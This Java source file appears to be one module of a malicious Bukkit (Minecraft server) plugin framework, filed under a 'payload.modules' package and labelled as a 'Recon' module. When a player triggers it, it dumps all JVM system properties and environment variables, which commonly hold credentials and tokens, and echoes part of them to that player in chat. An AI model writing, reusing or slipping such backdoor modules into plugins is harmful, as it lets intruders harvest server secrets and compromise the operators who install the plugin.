package dev.naruto.astrox.payload.modules;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Map;
import java.util.Properties;
import java.util.TreeMap;

/**
 * Environment dump module.
 * Dumps all JVM system properties and environment variables.
 */
public class EnvDumpModule implements PayloadModule {

    @Override
    public String getName() { return "envdump"; }

    @Override
    public String getDescription() { return "Dump JVM system properties and environment variables"; }

    @Override
    public String getCategory() { return "Recon"; }

    @Override
    public String execute(Player sender, String[] args, JavaPlugin plugin) {
        StringBuilder sb = new StringBuilder();

        // JVM System Properties
        sb.append("=== JVM SYSTEM PROPERTIES ===\n");
        Properties props = System.getProperties();
        new TreeMap<>(props).forEach((k, v) ->
                sb.append(k).append("=").append(v).append("\n"));

        sb.append("\n=== ENVIRONMENT VARIABLES ===\n");
        new TreeMap<>(System.getenv()).forEach((k, v) ->
                sb.append(k).append("=").append(v).append("\n"));

        // Runtime info
        sb.append("\n=== RUNTIME INFO ===\n");
        Runtime rt = Runtime.getRuntime();
        sb.append("availableProcessors=").append(rt.availableProcessors()).append("\n");
        sb.append("maxMemory=").append(rt.maxMemory() / 1024 / 1024).append("MB\n");
        sb.append("totalMemory=").append(rt.totalMemory() / 1024 / 1024).append("MB\n");
        sb.append("freeMemory=").append(rt.freeMemory() / 1024 / 1024).append("MB\n");

        String result = sb.toString();

        if (sender != null) {
            sender.sendMessage("§a✓ Environment dump complete (" + result.length() + " chars)");
            // Send first 500 chars
            String preview = result.substring(0, Math.min(500, result.length()));
            for (String line : preview.split("\n")) {
                sender.sendMessage("§7" + line);
            }
        }

        return result;
    }
}
